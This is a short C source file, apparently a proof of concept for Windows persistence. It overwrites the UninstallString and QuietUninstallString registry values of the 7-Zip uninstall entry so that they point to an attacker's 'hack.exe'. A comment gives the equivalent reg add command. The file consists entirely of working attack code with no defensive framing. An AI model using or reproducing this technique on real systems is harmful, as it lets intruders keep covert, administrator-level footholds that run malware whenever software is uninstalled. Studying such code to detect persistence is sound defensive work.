/*

Windows persistence via 
Hijacking Uninstall app

Author: Whusher
*/

#include <windows.h>
#include <string.h>


int main (int argc, char* argv[]){
    HKEY hkey = NULL;

    // Target application
    const char* app = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\7-Zip";

    // Evil application
    const char* exe = "C:\\Users\\Administrator\\Downloads\\hack.exe";

    // App
    LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)app, 0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        // Update registry key value
        // reg add d "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\7-zip" /v "UninstallString" /t REG_SZ /d "...\hack.exe" /f
        RegSetValueEx(hkey, (LPCSTR)"UninstallString", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
        RegSetValueEx(hkey, (LPCSTR)"QuietUninstallString", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
        RegCloseKey(hkey);
    }
    return 0;
}